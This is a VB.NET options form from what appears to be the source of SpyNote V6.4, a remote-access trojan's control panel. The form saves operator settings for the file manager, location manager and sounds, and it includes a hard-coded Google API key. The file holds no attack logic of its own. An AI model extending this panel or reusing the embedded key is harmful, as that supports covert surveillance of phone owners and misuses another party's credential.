Imports Microsoft.VisualBasic.CompilerServices
Imports System.IO
Imports System.Text
Imports SpyNote_V6._4.SN
Imports SpyNote_V6._4.SN.SpyNote.Stores

Public Class fOptions
    Private Sub fOptions_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
        Try
            MyBase.Icon = New System.Drawing.Icon(String.Concat(Store.Resources(1), "\Icons\window\win\9.ico"))
            Me.TextBox1.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
            Me.TextBox2.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
            Me.TextBox3.ContextMenuStrip = ContextTextView.ContextMenuContextTextView
            Me.TextBox1.Text = String.Concat(Data.OptionsLines(1), "%")
            Me.TrackAA1.Value = Conversions.ToInteger(Data.OptionsLines(1))
            Me.TextBox2.Text = String.Concat(Data.OptionsLines(2), "%")
            Me.TrackAA2.Value = Conversions.ToInteger(Data.OptionsLines(2))
            Me.TextBox3.Text = Data.OptionsLines(4)
            Me.Pi1.Tag = Data.OptionsLines(6)
            Me.Pi2.Tag = Data.OptionsLines(7)
            Me.Trans.Interval = Store.transparency
            Me.Trans.Enabled = True
        Catch ex As Exception

        End Try

    End Sub
    Private Sub Pi1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Pi1.Click
        If (Not Operators.ConditionalCompareObjectEqual(Me.Pi1.Tag, "OK", False)) Then
            Me.Pi1.Tag = "OK"
        Else
            Me.Pi1.Tag = "-"
        End If
    End Sub

    Private Sub Pi2_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Pi2.Click
        If (Not Operators.ConditionalCompareObjectEqual(Me.Pi2.Tag, "OK", False)) Then
            Me.Pi2.Tag = "OK"
        Else
            Me.Pi2.Tag = "-"
        End If
    End Sub

    Private Sub ThemeButton1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ThemeButton1.Click
        Dim stringBuilder As System.Text.StringBuilder = New System.Text.StringBuilder()
        stringBuilder.Append("FileManager" & vbCrLf & "")
        If (Me.TextBox1.Text.Trim() Is Nothing) Then
            MyBase.Close()
        Else
            Dim str As String = Me.TextBox1.Text.Trim().Replace("%", "")
            If (Not Versioned.IsNumeric(str)) Then
                MyBase.Close()
            Else
                Dim [integer] As Integer = Conversions.ToInteger(str)
                If (Not ([integer] > 100 Or [integer] < 1)) Then
                    stringBuilder.Append(String.Concat(Conversions.ToString([integer]), "" & vbCrLf & ""))
                    Data.OptionsLines(1) = Conversions.ToString([integer])
                Else
                    MyBase.Close()
                End If
            End If
        End If
        If (Me.TextBox2.Text.Trim() Is Nothing) Then
            MyBase.Close()
        Else
            Dim str1 As String = Me.TextBox2.Text.Trim().Replace("%", "")
            If (Not Versioned.IsNumeric(str1)) Then
                MyBase.Close()
            Else
                Dim num As Integer = Conversions.ToInteger(str1)
                If (Not (num > 100 Or num < 1)) Then
                    stringBuilder.Append(String.Concat(Conversions.ToString(num), "" & vbCrLf & ""))
                    SN.Data.OptionsLines(2) = Conversions.ToString(num)
                Else
                    MyBase.Close()
                End If
            End If
        End If
        stringBuilder.Append("LocationManager" & vbCrLf & "")
        If (Me.TextBox3.Text.Trim() Is Nothing) Then
            stringBuilder.Append("AIzaSyAf2Z-9OWLi_xUuq6YM8fycVk1vZPSuRI8" & vbCrLf & "")
            Data.OptionsLines(4) = "AIzaSyAf2Z-9OWLi_xUuq6YM8fycVk1vZPSuRI8"
        Else
            stringBuilder.Append(String.Concat(Me.TextBox3.Text.Trim(), "" & vbCrLf & ""))
            Data.OptionsLines(4) = Me.TextBox3.Text.Trim()
        End If
        stringBuilder.Append("Sounds" & vbCrLf & "")
        stringBuilder.Append(String.Concat(If(Operators.ConditionalCompareObjectEqual(Me.Pi1.Tag, "OK", False), "OK", "-"), "" & vbCrLf & ""))
        Data.OptionsLines(6) = Me.Pi1.Tag.ToString()
        stringBuilder.Append(String.Concat(If(Operators.ConditionalCompareObjectEqual(Me.Pi2.Tag, "OK", False), "OK", "-"), "" & vbCrLf & ""))
        Data.OptionsLines(7) = Me.Pi2.Tag.ToString()
        Dim str2 As String = String.Concat(Store.Resources(1), "\Imports\opt.inf")
        If (File.Exists(str2)) Then
            Dim streamWriter As System.IO.StreamWriter = New System.IO.StreamWriter(str2)
            streamWriter.Write(stringBuilder.ToString())
            streamWriter.Close()
            MyBase.Close()
        Else
            MyBase.Close()
        End If
    End Sub

    Private Sub TrackAA1_ValueChanged() Handles TrackAA1.ValueChanged
        Me.TextBox1.Text = String.Concat(Conversions.ToString(Me.TrackAA1.Value), "%")
    End Sub

    Private Sub TrackAA2_ValueChanged() Handles TrackAA2.ValueChanged
        Me.TextBox2.Text = String.Concat(Conversions.ToString(Me.TrackAA2.Value), "%")
    End Sub

    Private Sub Trans_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Trans.Tick
        If (MyBase.Opacity = 1) Then
            Me.Trans.Enabled = False
        Else
            MyBase.Opacity = MyBase.Opacity + 0.1
        End If
    End Sub

End Class